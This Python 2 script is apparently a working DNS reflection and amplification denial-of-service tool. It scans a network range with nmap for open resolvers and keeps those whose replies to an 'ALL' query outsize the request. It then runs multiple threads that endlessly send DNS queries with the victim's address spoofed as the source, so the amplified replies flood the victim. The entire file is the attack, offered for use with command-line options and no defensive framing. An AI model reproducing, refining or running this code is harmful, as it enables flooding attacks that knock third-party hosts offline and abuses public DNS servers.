#!/usr/bin/python

import nmap
from scapy.all import *
import threading
from optparse import OptionParser
import sys
import netaddr


def nmap_scan(targets):
    n=nmap.PortScanner()
    n.scan(hosts=targets,ports='53',arguments='-n --open')
    if n.all_hosts() ==[]:
        print 'no 53 port!!!!'
        return False

    #n=netaddr.IPNetwork(targets)
    host_list=[]
    for host in n.all_hosts():
        ans,uans=sr(IP(dst=str(host))/UDP()/DNS(qd=DNSQR(qname='yahoo.com.',qtype='ALL')),timeout=3)
        try:
            if len(ans[0][1])>len(ans[0][0]):
                host_list.append(str(host))
                print 'scan win!!!!!'
        except:
            pass

    print 'scaning down!!!!'
    f=open('hosts.txt','a')
    for host in host_list:
        f.write(host+'\n')
    f.close()
    return host_list

def DNS_Reflectivity(hosts_list,target):
    while True:
        try:
            for host in hosts_list:
                print 'send packet!!!!!'
                ans,uans=sr(IP(dst=host,src=target)/UDP()/DNS(qd=DNSQR(qname='yahoo.com.',qtype='ALL')),timeout=0.1)
        except:
            continue


def main():
    parser=OptionParser()
    parser.add_option('-t',action='store',type='string',dest='target_net_list')
    parser.add_option('-c',action='store',type='int',dest='thread_num')
    parser.add_option('-a',action='store',type='string',dest='target_A')
    (options,args)=parser.parse_args()

    thread=[]
    target_list=options.target_net_list
    thread_num=options.thread_num
    target_a=options.target_A

    hosts=nmap_scan(target_list)
    if hosts==False:
        print 'no scan!!!!'
        sys.exit()
    for threads in range(thread_num):
        thread.append(threading.Thread(target=DNS_Reflectivity,args=(hosts,target_a)).start())

if __name__ == '__main__':
    main()